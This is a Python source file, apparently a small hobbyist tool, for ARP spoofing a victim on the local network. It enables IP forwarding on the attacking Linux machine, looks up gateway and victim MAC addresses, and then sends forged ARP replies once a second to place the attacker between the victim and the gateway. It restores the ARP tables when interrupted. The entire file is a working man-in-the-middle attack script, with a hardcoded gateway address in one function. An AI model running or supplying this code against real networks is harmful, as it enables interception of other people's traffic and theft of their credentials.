import scapy.all as scapy
import argparse, os, time, subprocess, netifaces, sys, platform

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", dest="TARGET", help="Victim's IP", required=True)
options = parser.parse_args()

def get_ip_forward():
    ip_foward = "/proc/sys/net/ipv4/ip_forward"
    value = True

    if value is True:
        with open(ip_foward, mode='r+', encoding='utf_8') as config_file:
                line = next(config_file)
                config_file.seek(0)
                config_file.write(line.replace('0', '1'))
    
    chk_opt = subprocess.check_output('cat /proc/sys/net/ipv4/ip_forward', shell=True)
    return str(chk_opt.decode().strip())

def get_gateway_ip():
    gw = subprocess.check_output("route |  awk 'NR==3{ print $2}' | grep -Eo '[0-9]{1,4}.[0-9]{1,4}.[0-9]{1,4}.[0-9]{1,4}'", shell=True)
    return str(gw.decode().strip())

def get_gateway_mac():
    gw = subprocess.check_output("arp -a | grep 192.168.1.254" + " | awk '{print $4}'" , shell = True)
    gw2 = gw.decode()
    return str(gw2)

def get_interface():
    interfaces = netifaces.interfaces()

    if "wlan0" in interfaces:
        return str("wlan0")
    elif "eth0" in interfaces:
        return str("eth0")

def get_my_mac():
    interface = get_interface()

    if interface == "eth0":
        cmd = subprocess.check_output("ip link show eth0 | grep link/ether | awk '{print$2}'", shell=True)
        return str(cmd.decode())
    elif interface == "wlan0":
        cmd = subprocess.check_output("ip link show wlan0 | grep link/ether | awk '{print$2}'", shell=True)
        return str(cmd.decode())

def target_mac():
    cmd = subprocess.check_output(f"arp | grep {options.TARGET}" + " | awk '{print$3}'", shell=True)
    return str(cmd.decode().strip())


def spoofer_Linux():

    print('\n\033[1;32m[>>>] ARP Spoofing configuration:\n\033[1;37m')
    configurations = {'IPv4 Forwarding': str(get_ip_forward()),
                        'Interface': get_interface(),
                        'Attacker MAC': get_my_mac(),
                        'Gateway IP': get_gateway_ip(),
                        'Gateway MAC': get_gateway_mac(),
                        'Target IP': options.TARGET,
                        'Target MAC': target_mac()}

    for setting, value in configurations.items():
        print(f'[+] {setting} : {value}')

    def reARP():

        print("\n[*] Restoring Targets...")
        victimMAC = target_mac()
        gatewayMAC = get_gateway_mac()
        scapy.send(scapy.ARP(op = 2, pdst = get_gateway_ip(), psrc = options.TARGET, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac()), count = 7)
        scapy.send(scapy.ARP(op = 2, pdst = options.TARGET, psrc = get_gateway_ip(), hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = get_gateway_mac()), count = 7)
        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(gm, vm):
        scapy.send(scapy.ARP(op = 2, pdst = options.TARGET, psrc = get_gateway_ip(), hwdst= vm))
        scapy.send(scapy.ARP(op = 2, pdst = get_gateway_ip(), psrc = options.TARGET, hwdst= gm))
    
    while 1:
        try:
            trick(get_gateway_mac(), target_mac())
            time.sleep(1)
        except KeyboardInterrupt:
            reARP()
            break

palteforme = platform.system()


if str(palteforme) == "Linux":
    spoofer_Linux()
else:
    pass
    ## Later for Windows Users
